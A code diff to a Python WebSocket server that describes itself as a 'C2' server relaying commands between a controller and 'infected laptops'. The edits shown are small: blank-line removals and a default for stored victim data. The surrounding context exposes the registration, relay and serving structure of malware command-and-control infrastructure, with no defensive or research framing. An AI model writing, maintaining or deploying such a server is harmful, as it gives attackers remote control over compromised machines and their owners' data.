@@ -16,7 +16,6 @@ messages = []
 # Message retention time (1 day)
 MESSAGE_RETENTION_PERIOD = timedelta(days=1)
 
-
 # Utility function to clean up old messages
 def cleanup_old_messages():
     global messages
@@ -24,19 +23,17 @@ def cleanup_old_messages():
     messages[:] = [msg for msg in messages if msg['command_time'] > cutoff]
     logging.info(f"Cleaned up messages. Remaining messages: {len(messages)}")
 
-
 # Assign a unique ID to each new connection
 async def register_client(websocket, role, client_id, data=None):
     clients[client_id] = {
         'websocket': websocket,
         'last_seen': datetime.now(),
         'role': role,  # Store the role (controller or infected)
-        'data': data,  # Store additional data for infected laptops
+        'data': data or {},  # Store additional data for infected laptops
         'messages': []  # For storing unsent messages
     }
     logging.info(f"Registered new {role}: {client_id} with data: {data}")
     return client_id
-
 
 # Relay messages between control and infected laptops
 async def relay_messages(websocket, client_id, role):
@@ -112,7 +109,6 @@ async def relay_messages(websocket, client_id, role):
         except Exception as e:
             logging.error(f"Exception occurred: {e}", exc_info=True)
 
-
 # Handle new connections
 async def connection_handler(websocket, path):
     client_id = None  # Initialize client_id to None
@@ -138,7 +134,6 @@ async def connection_handler(websocket, path):
     except Exception as e:
         logging.error(f"Exception occurred in connection handler: {e}", exc_info=True)
 
-
 # Function to get the local IP address of the server
 def get_local_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -152,7 +147,6 @@ def get_local_ip():
         s.close()
     return ip
 
-
 # Start the WebSocket server
 async def main():
     ip_address = get_local_ip()  # Retrieve the IP address
@@ -164,7 +158,6 @@ async def main():
     async with websockets.serve(connection_handler, "0.0.0.0", port):
         logging.debug("C2 WebSocket server is running...")
         await asyncio.Future()  # Run forever
-
 
 if __name__ == "__main__":
     asyncio.run(main())
